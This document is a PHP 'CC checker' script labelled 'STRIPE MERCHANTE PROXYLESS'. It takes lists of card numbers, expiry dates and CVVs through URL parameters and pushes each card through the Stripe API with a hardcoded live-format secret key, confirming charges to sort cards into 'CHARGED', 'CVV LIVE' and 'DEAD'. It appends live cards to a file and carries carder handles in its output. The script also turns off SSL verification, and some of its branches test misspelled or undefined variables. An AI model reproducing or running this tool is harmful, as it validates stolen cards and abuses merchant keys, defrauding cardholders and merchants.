
<?php


//===================== [ sk based] ====================//
#---------------[ STRIPE MERCHANTE PROXYLESS ]----------------#



error_reporting(0);
date_default_timezone_set('America/Buenos_Aires');


//================ [ FUNCTIONS & LISTA ] ===============//

function GetStr($string, $start, $end){
    $string = ' ' . $string;
    $ini = strpos($string, $start);
    if ($ini == 0) return '';
    $ini += strlen($start);
    $len = strpos($string, $end, $ini) - $ini;
    return trim(strip_tags(substr($string, $ini, $len)));
}


function multiexplode($seperator, $string){
    $one = str_replace($seperator, $seperator[0], $string);
    $two = explode($seperator[0], $one);
    return $two;
    };

$sk = $_GET['sec'];  
$amt = $_GET['cst'];
$payment = "usd";
if(!isset($sk)){
  $sk = "sk_live_jtOcyYhgehbByQSICmwt9rwB";
}
if(!isset($cst)){
  $cst = 100;
}
$lista = $_GET['lista'];
    $cc = multiexplode(array(":", "|", ""), $lista)[0];
    $mes = multiexplode(array(":", "|", ""), $lista)[1];
    $ano = multiexplode(array(":", "|", ""), $lista)[2];
    $cvv = multiexplode(array(":", "|", ""), $lista)[3];

if (strlen($mes) == 1) $mes = "0$mes";
if (strlen($ano) == 2) $ano = "20$ano";




//================= [ CURL REQUESTS ] =================//

#-------------------[1st REQ]--------------------#
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_methods');
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_USERPWD, $sk. ':' . '');
curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&card[number]='.$cc.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&card[cvc]='.$cvv.'');
$result1 = curl_exec($ch);
$tok1 = Getstr($result1,'"id": "','"');
$msg = Getstr($result1,'"message": "','"');
//echo "<br><b>Result1: </b> $result1<br>";

#-------------------[2nd REQ]--------------------#

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_intents');
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_USERPWD, $sk. ':' . '');
curl_setopt($ch, CURLOPT_POSTFIELDS, 'amount='.$cst.'&currency='.$payment.'&payment_method_types[]=card');
$result2 = curl_exec($ch);
$tok2 = Getstr($result2,'"id": "','"');
//echo "<b>Result2: </b> $result2<br>";

#-------------------[3rd REQ]--------------------#

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_intents/'.$tok2.'/confirm');
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_USERPWD, $sk. ':' . '');
curl_setopt($ch, CURLOPT_POSTFIELDS, 'payment_method='.$tok1.'');
$result3 = curl_exec($ch);
$dcode = Getstr($result3,'"decline_code": "','"');
$reason = Getstr($result3,'"reason": "','"');
$riskl = Getstr($result3,'"risk_level": "','"');
$seller_msg = Getstr($result3,'"seller_message": "','"');
$cvccheck = Getstr($result3,'"cvc_check": "','"');

if ($cvccheck == "pass") $cvccheck = "Pass! ✅";
elseif ($cvccheck == "fail") $cvccheck = "Fail! ❌";
elseif ($cvccheck == "unavailable") $cvccheck = "NA";



$respo = "D_code: <b>$dcode | </b>Reason: <b>$reason | </b>Cvv: <b>$cvccheck | </b>Risk: <b>$riskl | </b>Msg: <b>$seller_msg</b><br>";
//echo "<b><br>| RESULT:  </b>$respo<br>";



$receipturl = trim(strip_tags(getStr($result3,'"receipt_url": "','"')));



//=================== [ RESPONSES ] ===================//

if(strpos($result3, '"seller_message": "Payment complete."' )) {
    echo '|𝘾𝙃𝘼𝙍𝙂𝙀𝘿 </span>  </span>CC:  '.$lista.'</span>  <br>➤ Response: $1 Charged ✅ <br/> | CHECKER BY - @DEVARJUNCC<br> ➤ Receipt : <a href='.$receipturl.'>Here</a><br>';
  fwrite(opccsbro.txt, '|𝘾𝙃𝘼𝙍𝙂𝙀𝘿 </span>  </span>CC:  '.$lista.'</span>  <br>➤ Response: $1 Charged ✅ <br/> | CHECKER BY - @DEVARJUNCC<br> ➤ Receipt : <a href='.$receipturl.'>Here</a><br>');
}
elseif(strpos($result3,'"cvc_check": "pass"')){
    echo '|𝘾𝙑𝙑</span>  </span>CC:  '.$lista.'</span>  <br>| RESULT:  CVV LIVE</span><br>';
  fwrite(opccsbro.txt, '|𝘾𝙑𝙑</span>  </span>CC:  '.$lista.'</span>  <br>| RESULT:  CVV LIVE</span><br>');
}


elseif(strpos($result1, "generic_decline")) {
    echo '|𝘿𝙀𝘼𝘿</span>  </span>CC:  '.$lista.'</span>  <br>| RESULT:  GENERIC DECLINED</span><br>';
    }
elseif(strpos($result3, "generic_decline" )) {
    echo '|𝘿𝙀𝘼𝘿</span>  </span>CC:  '.$lista.'</span>  <br>| RESULT:  GENERIC DECLINED</span><br>';
}
elseif(strpos($result3, "insufficient_funds" )) {
    echo '|𝘾𝙑𝙑</span>  </span>CC:  '.$lista.'</span>  <br>| RESULT:  INSUFFICIENT FUNDS</span><br>';
  fwrite(opccsbro.txt, '|𝘾𝙑𝙑</span>  </span>CC:  '.$lista.'</span>  <br>| RESULT:  INSUFFICIENT FUNDS</span><br>');
}

elseif(strpos($result3, "fraudulent" )) {
    echo '|𝘿𝙀𝘼𝘿</span>  </span>CC:  '.$lista.'</span>  <br>| RESULT:  FRAUDULENT</span><br>';
}
elseif(strpos($resul3, "do_not_honor" )) {
    echo '|𝘿𝙀𝘼𝘿</span>  </span>CC:  '.$lista.'</span>  <br>| RESULT:  DO NOT HONOR</span><br>';
    }
elseif(strpos($resul2, "do_not_honor" )) {
    echo '|𝘿𝙀𝘼𝘿</span>  </span>CC:  '.$lista.'</span>  <br>| RESULT:  DO NOT HONOR</span><br>';
}
elseif(strpos($result,"fraudulent")){
    echo '|𝘿𝙀𝘼𝘿</span>  </span>CC:  '.$lista.'</span>  <br>| RESULT:  FRAUDULENT</span><br>';

}

elseif(strpos($result2,'"code": "incorrect_cvc"')){
    echo '|𝘾𝙑𝙑</span>  </span>CC:  '.$lista.'</span>  <br>| RESULT:  Security code is incorrect by <br/> | CHECKER BY - @DEVARJUNCC</span><br>';
}
elseif(strpos($result1,' "code": "invalid_cvc"')){
    echo '|𝘾𝙑𝙑</span>  </span>CC:  '.$lista.'</span>  <br>| RESULT:  Security code is incorrect by <br/> | CHECKER BY - @DEVARJUNCC</span><br>';
     
}
elseif(strpos($result1,"invalid_expiry_month")){
    echo '|𝘿𝙀𝘼𝘿</span>  </span>CC:  '.$lista.'</span>  <br>| RESULT:  INVAILD EXPIRY MONTH</span><br>';

}
elseif(strpos($result2,"invalid_account")){
    echo '|𝘿𝙀𝘼𝘿</span>  </span>CC:  '.$lista.'</span>  <br>| RESULT:  INVAILD ACCOUNT</span><br>';

}

elseif(strpos($result2, "do_not_honor")) {
    echo '|𝘿𝙀𝘼𝘿</span>  </span>CC:  '.$lista.'</span>  <br>| RESULT:  DO NOT HONOR</span><br>';
}
elseif(strpos($result2, "lost_card" )) {
    echo '|𝘿𝙀𝘼𝘿</span>  </span>CC:  '.$lista.'</span>  <br>| RESULT:  LOST CARD</span><br>';
}
elseif(strpos($result3, "lost_card" )) {
    echo '|𝘿𝙀𝘼𝘿</span>  </span>CC:  '.$lista.'</span>  <br>| RESULT:  LOST CARD</span></span>  <br>| RESULT:  CHECKER BY GUNNU</span> <br>';
}

elseif(strpos($result2, "stolen_card" )) {
    echo '|𝘿𝙀𝘼𝘿</span>  </span>CC:  '.$lista.'</span>  <br>| RESULT:  STOLEN CARD</span><br>';
    }

elseif(strpos($result3, "stolen_card" )) {
    echo '|𝘿𝙀𝘼𝘿</span>  </span>CC:  '.$lista.'</span>  <br>| RESULT:  STOLEN CARD</span><br>';

}
elseif(strpos($result2, "transaction_not_allowed" )) {
    echo '|𝘾𝙑𝙑</span>  </span>CC:  '.$lista.'</span>  <br>| RESULT:  TRANSACTION NOT ALLOWED</span><br>';
    }
    elseif(strpos($result3, "authentication_required")) {
      echo '|𝘾𝙑𝙑</span>  </span>CC:  '.$lista.'</span>  <br>| RESULT:  32DS REQUIRED</span><br>';
   } 
   elseif(strpos($result3, "card_error_authentication_required")) {
      echo '|𝘾𝙑𝙑</span>  </span>CC:  '.$lista.'</span>  <br>| RESULT:  32DS REQUIRED</span><br>';
   } 
   elseif(strpos($result2, "card_error_authentication_required")) {
      echo '|𝘾𝙑𝙑</span>  </span>CC:  '.$lista.'</span>  <br>| RESULT:  32DS REQUIRED</span><br>';
   } 
   elseif(strpos($result1, "card_error_authentication_required")) {
      echo '|𝘾𝙑𝙑</span>  </span>CC:  '.$lista.'</span>  <br>| RESULT:  32DS REQUIRED</span><br>';
   } 
elseif(strpos($result3, "incorrect_cvc" )) {
    echo '|𝘾𝙑𝙑</span>  </span>CC:  '.$lista.'</span>  <br>| RESULT:  Security code is incorrect</span><br>';
}
elseif(strpos($result2, "pickup_card" )) {
    echo '|𝘿𝙀𝘼𝘿</span>  </span>CC:  '.$lista.'</span>  <br>| RESULT:  PICKUP CARD</span><br>';
}
elseif(strpos($result3, "pickup_card" )) {
    echo '|𝘿𝙀𝘼𝘿</span>  </span>CC:  '.$lista.'</span>  <br>| RESULT:  PICKUP CARD</span><br>';

}
elseif(strpos($result2, 'Your card has expired.')) {
    echo '|𝘿𝙀𝘼𝘿</span>  </span>CC:  '.$lista.'</span>  <br>| RESULT:  EXPIRED CARD</span><br>';
}
elseif(strpos($result3, 'Your card has expired.')) {
    echo '|𝘿𝙀𝘼𝘿</span>  </span>CC:  '.$lista.'</span>  <br>| RESULT:  EXPIRED CARD</span><br>';

}
elseif(strpos($result3, "card_decline_rate_limit_exceeded")) {
  echo '|𝘿𝙀𝘼𝘿</span>  </span>CC:  '.$lista.'</span>  <br>| RESULT:  SK IS AT RATE LIMIT</span><br>';
}
elseif(strpos($result3, '"code": "processing_error"')) {
    echo '|𝘿𝙀𝘼𝘿</span>  </span>CC:  '.$lista.'</span>  <br>| RESULT:  PROCESSING ERROR</span><br>';
    }
elseif(strpos($result3, ' "message": "Your card number is incorrect."')) {
    echo '|𝘿𝙀𝘼𝘿</span>  </span>CC:  '.$lista.'</span>  <br>| RESULT:  YOUR CARD NUMBER IS INCORRECT</span><br>';
    }
elseif(strpos($result3, '"decline_code": "service_not_allowed"')) {
    echo '|𝘿𝙀𝘼𝘿</span>  </span>CC:  '.$lista.'</span>  <br>| RESULT:  SERVICE NOT ALLOWED</span><br>';
    }
elseif(strpos($result2, '"code": "processing_error"')) {
    echo '|𝘿𝙀𝘼𝘿</span>  </span>CC:  '.$lista.'</span>  <br>| RESULT:  PROCESSING ERROR</span><br>';
    }
elseif(strpos($result2, ' "message": "Your card number is incorrect."')) {
    echo '|𝘿𝙀𝘼𝘿</span>  </span>CC:  '.$lista.'</span>  <br>| RESULT:  YOUR CARD NUMBER IS INCORRECT</span><br>';
    }
elseif(strpos($result2, '"decline_code": "service_not_allowed"')) {
    echo '|𝘿𝙀𝘼𝘿</span>  </span>CC:  '.$lista.'</span>  <br>| RESULT:  SERVICE NOT ALLOWED</span><br>';

}
elseif(strpos($result, "incorrect_number")) {
    echo '|𝘿𝙀𝘼𝘿</span>  </span>CC:  '.$lista.'</span>  <br>| RESULT:  INCORRECT CARD NUMBER</span><br>';
}
elseif(strpos($result1, "incorrect_number")) {
    echo '|𝘿𝙀𝘼𝘿</span>  </span>CC:  '.$lista.'</span>  <br>| RESULT:  INCORRECT CARD NUMBER</span><br>';


}elseif(strpos($result1, "do_not_honor")) {
    echo '|𝘿𝙀𝘼𝘿</span>  </span>CC:  '.$lista.'</span>  <br>| RESULT:  DO NOT HONOR</span><br>';

}
elseif(strpos($result1, 'Your card was declined.')) {
    echo '|𝘿𝙀𝘼𝘿</span>  </span>CC:  '.$lista.'</span>  <br>| RESULT:  CARD DECLINED</span><br>';

}
elseif(strpos($result1, "do_not_honor")) {
    echo '|𝘿𝙀𝘼𝘿</span>  </span>CC:  '.$lista.'</span>  <br>| RESULT:  DO NOT HONOR</span><br>';
    }
elseif(strpos($result2, "generic_decline")) {
    echo '|𝘿𝙀𝘼𝘿</span>  </span>CC:  '.$lista.'</span>  <br>| RESULT:  GENERIC CARD</span><br>';
}
elseif(strpos($result, 'Your card was declined.')) {
    echo '|𝘿𝙀𝘼𝘿</span>  </span>CC:  '.$lista.'</span>  <br>| RESULT:  CARD DECLINED</span><br>';

}
elseif(strpos($result3,' "decline_code": "do_not_honor"')){
    echo '|𝘿𝙀𝘼𝘿</span>  </span>CC:  '.$lista.'</span>  <br>| RESULT:  DO NOT HONOR</span><br>';
}
elseif(strpos($result2,'"cvc_check": "unchecked"')){
    echo '|𝘿𝙀𝘼𝘿</span>  </span>CC:  '.$lista.'</span>  <br>| RESULT:  GENERIC DECLINE <br/> | CHECKER BY - @DEVARJUNCC</span><br>';
}
elseif(strpos($result2,'"cvc_check": "fail"')){
    echo '|𝘿𝙀𝘼𝘿</span>  </span>CC:  '.$lista.'</span>  <br>| RESULT:  CVC_CHECK : FAIL</span><br>';
}
elseif(strpos($result3, "card_not_supported")) {
  echo '|𝘿𝙀𝘼𝘿</span>  </span>CC:  '.$lista.'</span>  <br>| RESULT:  CARD NOT SUPPORTED</span><br>';
}
elseif(strpos($result2,'"cvc_check": "unavailable"')){
    echo '|𝘿𝙀𝘼𝘿</span>  </span>CC:  '.$lista.'</span>  <br>| RESULT:  CVC_CHECK : UNVAILABLE</span><br>';
}
elseif(strpos($result3,'"cvc_check": "unchecked"')){
    echo '|𝘿𝙀𝘼𝘿</span>  </span>CC:  '.$lista.'</span>  <br>| RESULT:  GENERIC DECLINE <br/> | CHECKER BY - @TKKYTRSCC</span><br>';
}
elseif(strpos($result3,'"cvc_check": "fail"')){
    echo '|𝘿𝙀𝘼𝘿</span>  </span>CC:  '.$lista.'</span>  <br>| RESULT:  CVC_CHECKED : FAIL</span><br>';
}
elseif(strpos($result3,"currency_not_supported")) {
  echo '|𝘿𝙀𝘼𝘿</span>  </span>CC:  '.$lista.'</span>  <br>| RESULT:  CURRENCY NOT SUPORTED TRY IN INR</span><br>';
}

elseif (strpos($result,'Your card does not support this type of purchase.')) {
    echo '|𝘿𝙀𝘼𝘿</span> CC:  '.$lista.'</span>  <br>| RESULT:  CARD NOT SUPPORT THIS TYPE OF PURCHASE</span><br>';
    }

elseif(strpos($result2,'"cvc_check": "pass"')){
    echo '|𝘾𝙑𝙑</span>  </span>CC:  '.$lista.'</span>  <br>| RESULT:  CVV LIVE</span><br>';
}
elseif(strpos($result3, "fraudulent" )) {
    echo '|𝘿𝙀𝘼𝘿</span>  </span>CC:  '.$lista.'</span>  <br>| RESULT:  FRAUDULENT</span><br>';
}
elseif(strpos($result1, "testmode_charges_only" )) {
    echo '|𝘿𝙀𝘼𝘿</span>  </span>CC:  '.$lista.'</span>  <br>| RESULT:  SK KEY |𝘿𝙀𝘼𝘿 OR INVALID</span><br>';
}
elseif(strpos($result1, "api_key_expired" )) {
    echo '|𝘿𝙀𝘼𝘿</span>  </span>CC:  '.$lista.'</span>  <br>| RESULT:  SK KEY REVOKED</span><br>';
}
elseif(strpos($result1, "parameter_invalid_empty" )) {
    echo '|𝘿𝙀𝘼𝘿</span>  </span>CC:  '.$lista.'</span>  <br>| RESULT:  ENTER CC TO CHECK</span><br>';
}
elseif(strpos($result1, "card_not_supported" )) {
    echo '|𝘿𝙀𝘼𝘿</span>  </span>CC:  '.$lista.'</span>  <br>| RESULT:  CARD NOT SUPPORTED</span><br>';
}
else {
    echo '|𝘿𝙀𝘼𝘿</span> CC:  '.$lista.'</span>  <br>| RESULT:  GENERIC DECLINE <br/> | CHECKER BY - @DEVARJUNCC</span><br>';
   
   
      
}
curl_close($ch);
ob_flush();
?>